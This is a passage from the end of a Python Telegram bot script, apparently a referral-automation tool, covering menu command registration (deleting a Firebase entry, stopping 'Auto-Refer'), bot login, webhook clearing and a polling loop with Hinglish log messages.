            types.BotCommand("del_fb", "❌ Delete Firebase by number (/del_fb 1)"),
            types.BotCommand("stop", "⏹️ Stop Auto-Refer"),
        ])
        terminal_log("[BOT] Three-line Telegram bot menu commands successfully registered.")
    except Exception as e:
        terminal_log(f"[BOT] Menu command setup notice: {e}")

    try:
        me = bot.get_me()
        terminal_log(f"[BOT] ✓ Logged in as @{me.username} ({me.first_name})")
    except Exception as e:
        terminal_log(f"[BOT LOGIN ERROR] Bot token se connect nahi ho paya: {e}")
        print("[!] Kripya apna valid Telegram Bot Token verify karein.")
        return
    try:
        bot.delete_webhook(drop_pending_updates=False)
    except Exception as e:
        terminal_log(f"[BOT] Webhook clear notice: {e}")
    terminal_log("[BOT] Polling start ho raha hai... Telegram bot se /start bhejein!")

    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=False)
        except Exception as e:
            terminal_log(f"[BOT POLLING EXCEPTION] {e}")
            time.sleep(3)


if __name__ == "__main__":
    main()
